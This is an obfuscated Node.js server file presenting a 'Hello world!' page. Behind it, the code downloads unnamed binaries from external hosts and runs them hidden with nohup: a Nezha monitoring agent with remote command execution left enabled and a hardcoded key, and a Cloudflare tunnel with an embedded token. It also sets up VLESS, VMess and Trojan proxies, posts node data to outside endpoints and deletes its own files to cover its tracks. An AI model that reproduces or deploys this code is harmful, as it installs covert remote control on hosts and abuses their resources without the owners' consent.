const _0x113ede=_0x39bf;(function(_0x1f555c,_0x39c2e2){const _0x3e3285=_0x39bf,_0x282fa0=_0x1f555c();while(!![]){try{const _0x254292=parseInt(_0x3e3285(0x9a))/0x1*(-parseInt(_0x3e3285(0xa9))/0x2)+-parseInt(_0x3e3285(0xf5))/0x3+-parseInt(_0x3e3285(0x97))/0x4*(parseInt(_0x3e3285(0xb6))/0x5)+-parseInt(_0x3e3285(0x128))/0x6+parseInt(_0x3e3285(0xd7))/0x7+parseInt(_0x3e3285(0x10f))/0x8+parseInt(_0x3e3285(0x13f))/0x9;if(_0x254292===_0x39c2e2)break;else _0x282fa0['push'](_0x282fa0['shift']());}catch(_0x4d9d00){_0x282fa0['push'](_0x282fa0['shift']());}}}(_0x31ef,0x83c8c));const express=require(_0x113ede(0xc7)),app=express(),axios=require(_0x113ede(0x10a)),os=require('os'),fs=require('fs'),path=require(_0x113ede(0xbf)),{promisify}=require(_0x113ede(0xbd)),exec=promisify(require(_0x113ede(0xc8))[_0x113ede(0xa2)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x113ede(0xc6)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x113ede(0xb2)]||'',AUTO_ACCESS=process[_0x113ede(0xc6)][_0x113ede(0x8d)]||![],FILE_PATH=process[_0x113ede(0xc6)][_0x113ede(0x123)]||'./tmp',SUB_PATH=process[_0x113ede(0xc6)][_0x113ede(0x113)]||'sub',PORT=process[_0x113ede(0xc6)][_0x113ede(0x143)]||process[_0x113ede(0xc6)][_0x113ede(0x139)]||0x1eb4,UUID=process[_0x113ede(0xc6)][_0x113ede(0xbe)]||_0x113ede(0xc0),NEZHA_SERVER=process[_0x113ede(0xc6)]['NEZHA_SERVER']||_0x113ede(0x8c),NEZHA_PORT=process[_0x113ede(0xc6)][_0x113ede(0xb4)]||'',NEZHA_KEY=process[_0x113ede(0xc6)]['NEZHA_KEY']||'VHTEk5wXIwqMobTFE7wtJYy88ZtIRops',ARGO_DOMAIN=process['env'][_0x113ede(0xc2)]||_0x113ede(0xc3),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x113ede(0xd9),ARGO_PORT=process['env'][_0x113ede(0x134)]||0x1f41,CFIP=process[_0x113ede(0xc6)][_0x113ede(0xec)]||_0x113ede(0x91),CFPORT=process['env'][_0x113ede(0x9f)]||0x1bb,NAME=process[_0x113ede(0xc6)][_0x113ede(0x106)]||'leaflow';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x113ede(0x9b)](FILE_PATH+'\x20is\x20created')):console[_0x113ede(0x9b)](FILE_PATH+_0x113ede(0xab));function generateRandomName(){const _0x57cbd4=_0x113ede,_0x465e06=_0x57cbd4(0x127);let _0x28634c='';for(let _0x3fc8c8=0x0;_0x3fc8c8<0x6;_0x3fc8c8++){_0x28634c+=_0x465e06[_0x57cbd4(0xe1)](Math[_0x57cbd4(0x142)](Math[_0x57cbd4(0x124)]()*_0x465e06[_0x57cbd4(0x11a)]));}return _0x28634c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x39bf(_0x18e1a1,_0x15a4ed){_0x18e1a1=_0x18e1a1-0x8a;const _0x31ef11=_0x31ef();let _0x39bfd2=_0x31ef11[_0x18e1a1];return _0x39bfd2;}let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x113ede(0x12c)](FILE_PATH,phpName),webPath=path[_0x113ede(0x12c)](FILE_PATH,webName),botPath=path[_0x113ede(0x12c)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x113ede(0x119)),listPath=path['join'](FILE_PATH,_0x113ede(0xe4)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x113ede(0x12c)](FILE_PATH,_0x113ede(0x11d));function deleteNodes(){const _0x3b7739=_0x113ede;try{if(!UPLOAD_URL)return;if(!fs[_0x3b7739(0x117)](subPath))return;let _0x4f3a2f;try{_0x4f3a2f=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x392ab9=Buffer[_0x3b7739(0xfd)](_0x4f3a2f,_0x3b7739(0x13a))[_0x3b7739(0xee)]('utf-8'),_0x17087f=_0x392ab9[_0x3b7739(0xe7)]('\x0a')[_0x3b7739(0xa6)](_0x4d6a40=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3b7739(0x111)](_0x4d6a40));if(_0x17087f[_0x3b7739(0x11a)]===0x0)return;return axios['post'](UPLOAD_URL+_0x3b7739(0x98),JSON[_0x3b7739(0xbc)]({'nodes':_0x17087f}),{'headers':{'Content-Type':'application/json'}})[_0x3b7739(0xef)](_0x59bdc6=>{return null;}),null;}catch(_0x4a6633){return null;}}function cleanupOldFiles(){const _0x4db2d3=_0x113ede;try{const _0xd58ae7=fs['readdirSync'](FILE_PATH);_0xd58ae7[_0x4db2d3(0xb0)](_0x36ec3e=>{const _0x4e375d=_0x4db2d3,_0x30cf9e=path['join'](FILE_PATH,_0x36ec3e);try{const _0x2260b9=fs[_0x4e375d(0xb7)](_0x30cf9e);_0x2260b9[_0x4e375d(0x105)]()&&fs[_0x4e375d(0x90)](_0x30cf9e);}catch(_0x3ecb65){}});}catch(_0x17eaf1){}}app[_0x113ede(0x13c)]('/',function(_0x5945ab,_0x3e0d1f){const _0x42e068=_0x113ede;_0x3e0d1f[_0x42e068(0xa7)](_0x42e068(0xb5));});async function generateConfig(){const _0x243c76=_0x113ede,_0x2979f8={'log':{'access':_0x243c76(0x133),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x243c76(0xfe),'settings':{'clients':[{'id':UUID,'flow':_0x243c76(0xcb)}],'decryption':_0x243c76(0xfa),'fallbacks':[{'dest':0xbb9},{'path':_0x243c76(0x10d),'dest':0xbba},{'path':_0x243c76(0x112),'dest':0xbbb},{'path':_0x243c76(0x8f),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x243c76(0x132),'protocol':_0x243c76(0xfe),'settings':{'clients':[{'id':UUID}],'decryption':_0x243c76(0xfa)},'streamSettings':{'network':'tcp','security':_0x243c76(0xfa)}},{'port':0xbba,'listen':_0x243c76(0x132),'protocol':_0x243c76(0xfe),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x243c76(0xfa),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x243c76(0x136),_0x243c76(0xad),_0x243c76(0x146)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x243c76(0x132),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x243c76(0x112)}},'sniffing':{'enabled':!![],'destOverride':[_0x243c76(0x136),_0x243c76(0xad),_0x243c76(0x146)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x243c76(0x132),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x243c76(0xfa),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x243c76(0x136),_0x243c76(0xad),_0x243c76(0x146)],'metadataOnly':![]}}],'dns':{'servers':[_0x243c76(0xd2)]},'outbounds':[{'protocol':_0x243c76(0xc9),'tag':'direct'},{'protocol':_0x243c76(0x10b),'tag':_0x243c76(0xf2)}]};fs[_0x243c76(0xd0)](path[_0x243c76(0x12c)](FILE_PATH,_0x243c76(0x11d)),JSON[_0x243c76(0xbc)](_0x2979f8,null,0x2));}function getSystemArchitecture(){const _0x4ea78f=_0x113ede,_0x4d808b=os['arch']();return _0x4d808b===_0x4ea78f(0xd1)||_0x4d808b===_0x4ea78f(0xf4)||_0x4d808b===_0x4ea78f(0xdd)?'arm':'amd';}function downloadFile(_0x11e47b,_0x204d54,_0x4eb6dd){const _0x5d508b=_0x113ede,_0x224f8a=_0x11e47b;!fs['existsSync'](FILE_PATH)&&fs[_0x5d508b(0x11b)](FILE_PATH,{'recursive':!![]});const _0x215680=fs[_0x5d508b(0x104)](_0x224f8a);axios({'method':_0x5d508b(0x13c),'url':_0x204d54,'responseType':_0x5d508b(0x141)})[_0x5d508b(0xb1)](_0x27aa1e=>{const _0xe99236=_0x5d508b;_0x27aa1e[_0xe99236(0x13e)][_0xe99236(0xf6)](_0x215680),_0x215680['on'](_0xe99236(0xe3),()=>{const _0x189c0e=_0xe99236;_0x215680['close'](),console['log'](_0x189c0e(0xcc)+path[_0x189c0e(0xd6)](_0x224f8a)+_0x189c0e(0x9e)),_0x4eb6dd(null,_0x224f8a);}),_0x215680['on']('error',_0x402e08=>{const _0x494977=_0xe99236;fs[_0x494977(0xdb)](_0x224f8a,()=>{});const _0x12e9a7=_0x494977(0xcc)+path['basename'](_0x224f8a)+_0x494977(0xbb)+_0x402e08[_0x494977(0xb9)];console[_0x494977(0xa3)](_0x12e9a7),_0x4eb6dd(_0x12e9a7);});})[_0x5d508b(0xef)](_0x1d59b3=>{const _0x2ee38e=_0x5d508b,_0x1aa6ac='Download\x20'+path[_0x2ee38e(0xd6)](_0x224f8a)+_0x2ee38e(0xbb)+_0x1d59b3['message'];console[_0x2ee38e(0xa3)](_0x1aa6ac),_0x4eb6dd(_0x1aa6ac);});}async function downloadFilesAndRun(){const _0x20d9bd=_0x113ede,_0x45228f=getSystemArchitecture(),_0x422373=getFilesForArchitecture(_0x45228f);if(_0x422373[_0x20d9bd(0x11a)]===0x0){console[_0x20d9bd(0x9b)](_0x20d9bd(0x107));return;}const _0x244e8f=_0x422373[_0x20d9bd(0x11e)](_0x2db7a8=>{return new Promise((_0x31468d,_0x91d583)=>{const _0x47c86a=_0x39bf;downloadFile(_0x2db7a8[_0x47c86a(0x96)],_0x2db7a8['fileUrl'],(_0x3c233d,_0x42ab4d)=>{_0x3c233d?_0x91d583(_0x3c233d):_0x31468d(_0x42ab4d);});});});try{await Promise[_0x20d9bd(0xeb)](_0x244e8f);}catch(_0x865a16){console[_0x20d9bd(0xa3)](_0x20d9bd(0xae),_0x865a16);return;}function _0x571149(_0x5344db){const _0x49ea80=_0x20d9bd,_0x4c4d6b=0x1fd;_0x5344db[_0x49ea80(0xb0)](_0x566b45=>{const _0x4b787e=_0x49ea80;fs[_0x4b787e(0x117)](_0x566b45)&&fs[_0x4b787e(0xe8)](_0x566b45,_0x4c4d6b,_0x29d7c8=>{const _0x5225c2=_0x4b787e;_0x29d7c8?console['error']('Empowerment\x20failed\x20for\x20'+_0x566b45+':\x20'+_0x29d7c8):console[_0x5225c2(0x9b)](_0x5225c2(0xdc)+_0x566b45+':\x20'+_0x4c4d6b[_0x5225c2(0xee)](0x8));});});}const _0x4d6c9b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x571149(_0x4d6c9b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2f254f=NEZHA_SERVER[_0x20d9bd(0xe9)](':')?NEZHA_SERVER[_0x20d9bd(0xe7)](':')[_0x20d9bd(0xf1)]():'',_0x5b4bcd=new Set([_0x20d9bd(0xed),_0x20d9bd(0x101),_0x20d9bd(0x92),_0x20d9bd(0xcf),_0x20d9bd(0xcd),_0x20d9bd(0x9c)]),_0x4e6704=_0x5b4bcd[_0x20d9bd(0x135)](_0x2f254f)?'true':_0x20d9bd(0x93),_0xcfb9d5='\x0aclient_secret:\x20'+NEZHA_KEY+_0x20d9bd(0xd5)+NEZHA_SERVER+_0x20d9bd(0xde)+_0x4e6704+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x20d9bd(0xd0)](path[_0x20d9bd(0x12c)](FILE_PATH,_0x20d9bd(0xda)),_0xcfb9d5);const _0x384e14=_0x20d9bd(0xf3)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x20d9bd(0x94);try{await exec(_0x384e14),console[_0x20d9bd(0x9b)](phpName+'\x20is\x20running'),await new Promise(_0x4a1409=>setTimeout(_0x4a1409,0x3e8));}catch(_0x2a8d72){console['error'](_0x20d9bd(0x103)+_0x2a8d72);}}else{let _0x1fdbca='';const _0x69878e=[_0x20d9bd(0xed),'8443',_0x20d9bd(0x92),'2087','2083','2053'];_0x69878e[_0x20d9bd(0xe9)](NEZHA_PORT)&&(_0x1fdbca=_0x20d9bd(0x95));const _0x416e48=_0x20d9bd(0xf3)+npmPath+_0x20d9bd(0x145)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1fdbca+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x416e48),console[_0x20d9bd(0x9b)](npmName+'\x20is\x20running'),await new Promise(_0x4d9dc7=>setTimeout(_0x4d9dc7,0x3e8));}catch(_0x2172b7){console['error'](_0x20d9bd(0xea)+_0x2172b7);}}}else console[_0x20d9bd(0x9b)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3ab6f4=_0x20d9bd(0xf3)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3ab6f4),console[_0x20d9bd(0x9b)](webName+_0x20d9bd(0x11f)),await new Promise(_0x4631e8=>setTimeout(_0x4631e8,0x3e8));}catch(_0x58dca7){console[_0x20d9bd(0xa3)](_0x20d9bd(0x121)+_0x58dca7);}if(fs[_0x20d9bd(0x117)](botPath)){let _0x582d64;if(ARGO_AUTH[_0x20d9bd(0x109)](/^[A-Z0-9a-z=]{120,250}$/))_0x582d64=_0x20d9bd(0xa4)+ARGO_AUTH;else ARGO_AUTH[_0x20d9bd(0x109)](/TunnelSecret/)?_0x582d64='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x20d9bd(0x108):_0x582d64=_0x20d9bd(0xf7)+FILE_PATH+_0x20d9bd(0x8a)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x582d64+_0x20d9bd(0xb8)),console[_0x20d9bd(0x9b)](botName+_0x20d9bd(0x11f)),await new Promise(_0x47f0bb=>setTimeout(_0x47f0bb,0x7d0));}catch(_0x3b5bac){console[_0x20d9bd(0xa3)]('Error\x20executing\x20command:\x20'+_0x3b5bac);}}await new Promise(_0x2658e9=>setTimeout(_0x2658e9,0x1388));}function getFilesForArchitecture(_0x3d6306){const _0x1fa0d3=_0x113ede;let _0x26c0fd;_0x3d6306===_0x1fa0d3(0xd1)?_0x26c0fd=[{'fileName':webPath,'fileUrl':_0x1fa0d3(0xa0)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x26c0fd=[{'fileName':webPath,'fileUrl':_0x1fa0d3(0xe2)},{'fileName':botPath,'fileUrl':_0x1fa0d3(0xa5)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x78c7e8=_0x3d6306===_0x1fa0d3(0xd1)?_0x1fa0d3(0x125):_0x1fa0d3(0xd3);_0x26c0fd[_0x1fa0d3(0xc4)]({'fileName':npmPath,'fileUrl':_0x78c7e8});}else{const _0x3954ae=_0x3d6306===_0x1fa0d3(0xd1)?_0x1fa0d3(0x10c):'https://amd64.ssss.nyc.mn/v1';_0x26c0fd[_0x1fa0d3(0xc4)]({'fileName':phpPath,'fileUrl':_0x3954ae});}}return _0x26c0fd;}function argoType(){const _0x59e5ef=_0x113ede;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x59e5ef(0x9b)](_0x59e5ef(0xc5));return;}if(ARGO_AUTH[_0x59e5ef(0xe9)](_0x59e5ef(0xa1))){fs[_0x59e5ef(0xd0)](path[_0x59e5ef(0x12c)](FILE_PATH,_0x59e5ef(0xa8)),ARGO_AUTH);const _0x4dda6b=_0x59e5ef(0x9d)+ARGO_AUTH[_0x59e5ef(0xe7)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x59e5ef(0x12c)](FILE_PATH,_0x59e5ef(0xa8))+_0x59e5ef(0xaa)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x59e5ef(0xd0)](path[_0x59e5ef(0x12c)](FILE_PATH,_0x59e5ef(0x114)),_0x4dda6b);}else console['log'](_0x59e5ef(0x131));}argoType();async function extractDomains(){const _0x208d6c=_0x113ede;let _0x30b324;if(ARGO_AUTH&&ARGO_DOMAIN)_0x30b324=ARGO_DOMAIN,console[_0x208d6c(0x9b)](_0x208d6c(0xf9),_0x30b324),await _0x685bae(_0x30b324);else try{const _0x5908fe=fs[_0x208d6c(0x99)](path[_0x208d6c(0x12c)](FILE_PATH,_0x208d6c(0xe5)),'utf-8'),_0x1e7737=_0x5908fe[_0x208d6c(0xe7)]('\x0a'),_0x44723e=[];_0x1e7737[_0x208d6c(0xb0)](_0x2fe3f7=>{const _0x2404cc=_0x208d6c,_0x4082f5=_0x2fe3f7[_0x2404cc(0x109)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4082f5){const _0x3ec228=_0x4082f5[0x1];_0x44723e[_0x2404cc(0x129)](_0x3ec228);}});if(_0x44723e[_0x208d6c(0x11a)]>0x0)_0x30b324=_0x44723e[0x0],console[_0x208d6c(0x9b)](_0x208d6c(0xd8),_0x30b324),await _0x685bae(_0x30b324);else{console[_0x208d6c(0x9b)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path['join'](FILE_PATH,_0x208d6c(0xe5)));async function _0xdc00f0(){const _0x226774=_0x208d6c;try{process[_0x226774(0xc1)]==='win32'?await exec(_0x226774(0x118)+botName+_0x226774(0x8b)):await exec(_0x226774(0x120)+botName[_0x226774(0xe1)](0x0)+']'+botName[_0x226774(0xfc)](0x1)+_0x226774(0x12f));}catch(_0x4fdb1b){}}_0xdc00f0(),await new Promise(_0x3514b3=>setTimeout(_0x3514b3,0xbb8));const _0x1a206e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x208d6c(0x8a)+ARGO_PORT;try{await exec(_0x208d6c(0xf3)+botPath+'\x20'+_0x1a206e+'\x20>/dev/null\x202>&1\x20&'),console[_0x208d6c(0x9b)](botName+_0x208d6c(0x11f)),await new Promise(_0xcbca80=>setTimeout(_0xcbca80,0xbb8)),await extractDomains();}catch(_0x1c69e0){console[_0x208d6c(0xa3)]('Error\x20executing\x20command:\x20'+_0x1c69e0);}}}catch(_0x44190c){console['error'](_0x208d6c(0xac),_0x44190c);}async function _0x685bae(_0x24ec60){const _0x475b55=_0x208d6c,_0x3446bc=execSync(_0x475b55(0xe6),{'encoding':'utf-8'}),_0x490295=_0x3446bc['trim'](),_0x22a1fe=NAME?NAME+'-'+_0x490295:_0x490295;return new Promise(_0x6c9fe5=>{setTimeout(()=>{const _0x5aa7e6=_0x39bf,_0x56cce4={'v':'2','ps':''+_0x22a1fe,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x5aa7e6(0xfa),'host':_0x24ec60,'path':_0x5aa7e6(0x140),'tls':_0x5aa7e6(0xad),'sni':_0x24ec60,'alpn':'','fp':_0x5aa7e6(0xf0)},_0x580c0f=_0x5aa7e6(0x138)+UUID+'@'+CFIP+':'+CFPORT+_0x5aa7e6(0x13d)+_0x24ec60+_0x5aa7e6(0xca)+_0x24ec60+_0x5aa7e6(0x12d)+_0x22a1fe+_0x5aa7e6(0xb3)+Buffer[_0x5aa7e6(0xfd)](JSON[_0x5aa7e6(0xbc)](_0x56cce4))['toString'](_0x5aa7e6(0x13a))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x5aa7e6(0x12a)+_0x24ec60+'&fp=firefox&type=ws&host='+_0x24ec60+_0x5aa7e6(0x122)+_0x22a1fe+_0x5aa7e6(0x102);console[_0x5aa7e6(0x9b)](Buffer['from'](_0x580c0f)[_0x5aa7e6(0xee)](_0x5aa7e6(0x13a))),fs[_0x5aa7e6(0xd0)](subPath,Buffer[_0x5aa7e6(0xfd)](_0x580c0f)[_0x5aa7e6(0xee)](_0x5aa7e6(0x13a))),console[_0x5aa7e6(0x9b)](FILE_PATH+_0x5aa7e6(0xe0)),uploadNodes(),app[_0x5aa7e6(0x13c)]('/'+SUB_PATH,(_0x51accf,_0x4c73ca)=>{const _0x20172d=_0x5aa7e6,_0xe6b01=Buffer[_0x20172d(0xfd)](_0x580c0f)[_0x20172d(0xee)](_0x20172d(0x13a));_0x4c73ca[_0x20172d(0x12b)]('Content-Type',_0x20172d(0xfb)),_0x4c73ca[_0x20172d(0xa7)](_0xe6b01);}),_0x6c9fe5(_0x580c0f);},0x7d0);});}}async function uploadNodes(){const _0x4ee5ed=_0x113ede;if(UPLOAD_URL&&PROJECT_URL){const _0x5a50f2=PROJECT_URL+'/'+SUB_PATH,_0x4bb077={'subscription':[_0x5a50f2]};try{const _0x235cae=await axios[_0x4ee5ed(0x12e)](UPLOAD_URL+_0x4ee5ed(0xd4),_0x4bb077,{'headers':{'Content-Type':_0x4ee5ed(0xaf)}});return _0x235cae&&_0x235cae['status']===0xc8?(console[_0x4ee5ed(0x9b)]('Subscription\x20uploaded\x20successfully'),_0x235cae):null;}catch(_0x3c5cd3){if(_0x3c5cd3[_0x4ee5ed(0xff)]){if(_0x3c5cd3['response'][_0x4ee5ed(0x10e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4b7a36=fs[_0x4ee5ed(0x99)](listPath,'utf-8'),_0x1e1997=_0x4b7a36[_0x4ee5ed(0xe7)]('\x0a')[_0x4ee5ed(0xa6)](_0x5b09fc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4ee5ed(0x111)](_0x5b09fc));if(_0x1e1997['length']===0x0)return;const _0x41325f=JSON[_0x4ee5ed(0xbc)]({'nodes':_0x1e1997});try{const _0x548bb2=await axios['post'](UPLOAD_URL+_0x4ee5ed(0xf8),_0x41325f,{'headers':{'Content-Type':'application/json'}});return _0x548bb2&&_0x548bb2[_0x4ee5ed(0x10e)]===0xc8?(console[_0x4ee5ed(0x9b)](_0x4ee5ed(0x144)),_0x548bb2):null;}catch(_0x5cc124){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x246fab=_0x39bf,_0x4caf60=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4caf60['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4caf60['push'](phpPath);process[_0x246fab(0xc1)]===_0x246fab(0x137)?exec(_0x246fab(0xba)+_0x4caf60[_0x246fab(0x12c)]('\x20')+_0x246fab(0x126),_0x34e0a1=>{const _0x445f59=_0x246fab;console['clear'](),console['log'](_0x445f59(0xdf)),console['log'](_0x445f59(0x13b));}):exec(_0x246fab(0x8e)+_0x4caf60[_0x246fab(0x12c)]('\x20')+_0x246fab(0x116),_0x1cb0c9=>{const _0x6ae2a1=_0x246fab;console['clear'](),console[_0x6ae2a1(0x9b)](_0x6ae2a1(0xdf)),console[_0x6ae2a1(0x9b)](_0x6ae2a1(0x13b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3f397c=_0x113ede;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3f397c(0x9b)](_0x3f397c(0x130));return;}try{const _0x5aeeda=await axios[_0x3f397c(0x12e)](_0x3f397c(0xce),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3f397c(0xaf)}});return console[_0x3f397c(0x9b)](_0x3f397c(0x110)),_0x5aeeda;}catch(_0x192c4a){return console[_0x3f397c(0xa3)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x192c4a[_0x3f397c(0xb9)]),null;}}async function startserver(){const _0x9a621=_0x113ede;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x238f71){console[_0x9a621(0xa3)](_0x9a621(0x100),_0x238f71);}}startserver()[_0x113ede(0xef)](_0x249aa8=>{const _0x381a64=_0x113ede;console[_0x381a64(0xa3)](_0x381a64(0x11c),_0x249aa8);}),app[_0x113ede(0x115)](PORT,()=>console[_0x113ede(0x9b)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));function _0x31ef(){const _0x465710=['pipe','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/add-nodes','ARGO_DOMAIN:','none','text/plain;\x20charset=utf-8','substring','from','vless','response','Error\x20in\x20startserver:','8443','\x0a\x20\x20\x20\x20','php\x20running\x20error:\x20','createWriteStream','isFile','NAME','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/tunnel.yml\x20run','match','axios','blackhole','https://arm64.ssss.nyc.mn/v1','/vless-argo','status','3406112WQZfdP','automatic\x20access\x20task\x20added\x20successfully','test','/vmess-argo','SUB_PATH','tunnel.yml','listen','\x20>/dev/null\x202>&1','existsSync','taskkill\x20/f\x20/im\x20','sub.txt','length','mkdirSync','Unhandled\x20error\x20in\x20startserver:','config.json','map','\x20is\x20running','pkill\x20-f\x20\x22[','web\x20running\x20error:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','FILE_PATH','random','https://arm64.ssss.nyc.mn/agent','\x20>\x20nul\x202>&1','abcdefghijklmnopqrstuvwxyz','273390zrfgnm','push','?security=tls&sni=','set','join','&path=%2Fvless-argo%3Fed%3D2560#','post','\x22\x20>\x20/dev/null\x202>&1','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','127.0.0.1','/dev/null','ARGO_PORT','has','http','win32','\x0avless://','PORT','base64','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','get','?encryption=none&security=tls&sni=','data','23984064VGhHod','/vmess-argo?ed=2560','stream','floor','SERVER_PORT','Nodes\x20uploaded\x20successfully','\x20-s\x20','quic','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','.exe\x20>\x20nul\x202>&1','a.holoy.dpdns.org:36958','AUTO_ACCESS','rm\x20-rf\x20','/trojan-argo','unlinkSync','cdns.doon.eu.org','2096','false','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','--tls','fileName','2780868JUJlkh','/api/delete-nodes','readFileSync','3XkIwMk','log','2053','\x0a\x20\x20tunnel:\x20','\x20successfully','CFPORT','https://arm64.ssss.nyc.mn/web','TunnelSecret','exec','error','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/bot','filter','send','tunnel.json','616134PFklMv','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20already\x20exists','Error\x20reading\x20boot.log:','tls','Error\x20downloading\x20files:','application/json','forEach','then','PROJECT_URL','\x0a\x20\x20\x0avmess://','NEZHA_PORT','Hello\x20world!','5eRYXXF','statSync','\x20>/dev/null\x202>&1\x20&','message','del\x20/f\x20/q\x20','\x20failed:\x20','stringify','util','UUID','path','9afd1229-b893-40c1-84dd-51e7ce204913','platform','ARGO_DOMAIN','leaflow.holoy.qzz.io','unshift','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','env','express','child_process','freedom','&fp=firefox&type=ws&host=','xtls-rprx-vision','Download\x20','2083','https://oooo.serv00.net/add-url','2087','writeFileSync','arm','https+local://8.8.8.8/dns-query','https://amd64.ssss.nyc.mn/agent','/api/add-subscriptions','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','basename','533281fmdHsf','ArgoDomain:','eyJhIjoiYjNiMmRhZjE1YjIzYmQ2ZmIzNzZlNGViYTRhYzczYTEiLCJ0IjoiZDRkNDVjNjItZDcxZC00NjZiLWI1NzUtZDlkMzcwNjJmOTA4IiwicyI6Ik9HRXpNbU0wT1dRdE5qZzROaTAwWkRGa0xXRXpaR0V0WXpFMVlqazJOVFU1WmpSayJ9','config.yaml','unlink','Empowerment\x20success\x20for\x20','aarch64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','App\x20is\x20running','/sub.txt\x20saved\x20successfully','charAt','https://amd64.ssss.nyc.mn/web','finish','list.txt','boot.log','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','split','chmod','includes','npm\x20running\x20error:\x20','all','CFIP','443','toString','catch','firefox','pop','block','nohup\x20','arm64','2886216WkbGqX'];_0x31ef=function(){return _0x465710;};return _0x31ef();}
